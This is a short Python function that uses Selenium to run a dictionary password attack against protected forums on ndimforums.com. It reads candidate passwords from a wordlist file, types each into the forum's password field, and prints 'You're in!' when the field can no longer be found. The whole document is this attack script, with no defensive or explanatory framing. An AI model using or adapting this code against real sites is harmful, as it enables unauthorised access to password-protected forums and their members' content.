def pass_bruteforce(url,forumid,requestFile,driver):
	passFile = "{}".format(requestFile)
	passList = open(passFile, "r")
	driver.get("http://www.ndimforums.com/{}/forumpassword.asp?forumid={}".format(url, forumid))
	for index, line in enumerate(passList):
		try:
			print('Attempted password ' + str(index) + ": " + line, flush=True)
			passwordField = driver.find_element(By.XPATH,
												"/html/body/div/form[3]/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/input")
			passwordField.send_keys(line)
		except:
			print('Attempted password ' + str(index) + ": " + line, flush=True)
			print("You're in!")
			main()
	print(
		'Password not cracked. Double-check the dictionary and ensure Chrome is not minimized before trying again.')
	passList.close()